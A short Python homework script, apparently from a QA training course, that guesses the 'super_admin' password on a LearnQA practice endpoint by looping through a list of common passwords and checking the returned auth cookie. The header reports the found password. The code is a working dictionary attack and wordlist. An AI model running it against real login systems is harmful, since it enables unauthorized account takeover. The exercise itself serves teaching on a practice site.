# Ответ:
"""
Пароль: welcome
https://github.com/OBLAKOPOLYAKOV/LearnQA_PythonAPI/commit/22ab8389dc7df60024aba14968dc1c6483ef2cd2
"""

import requests

url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
urlcheck = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
badcookies = "You are NOT authorized"
goodcookies = "You are authorized"
login = "super_admin"
password = ['123456', 'password', '123456789', '12345678', 'qwerty', 'adobe123[a]', 'baseball', 'trustno1',
            'qwerty123', 'iloveyou', '1234567', '1234567890', '1q2w3e4r', '666666', 'photoshop[a]', '111111',
            '1qaz2wsx', 'admin', 'abc123', '1234', 'mustang', '121212', 'starwars', 'bailey', 'access', 'flower',
            '555555', 'monkey', 'lovely', 'shadow', 'ashley', 'sunshine', 'letmein', 'dragon', 'passw0rd',
            '7777777', '123123', 'football', '12345', 'michael', 'login', '!@#$%^&*', 'welcome', '654321',
            'jesus', 'password1', 'master', 'hello', 'charlie', '888888', 'superman', '696969', 'qwertyuiop',
            'hottie', 'freedom', 'aa123456', 'princess', 'qazwsx', 'ninja', 'azerty', 'solo', 'loveme', 'whatever',
            'donald', 'batman', 'zaq1zaq1', 'Football', '000000']


for pas in password:
    payload = {"login":login, "password":pas}
    # 1 Получаем куки
    response = requests.post(url, data = payload)
    cookies = response.cookies.get('auth_cookie')
    cookiestosecond = {'auth_cookie': cookies}
    # 2 Проверяем куки
    resoult = requests.post(urlcheck, cookies=cookiestosecond)
    if resoult.text == goodcookies:
        print(f"Логин: {login}, Пароль: {pas}, Текст: {resoult.text}, "
              f"Куки: {cookies}")
        break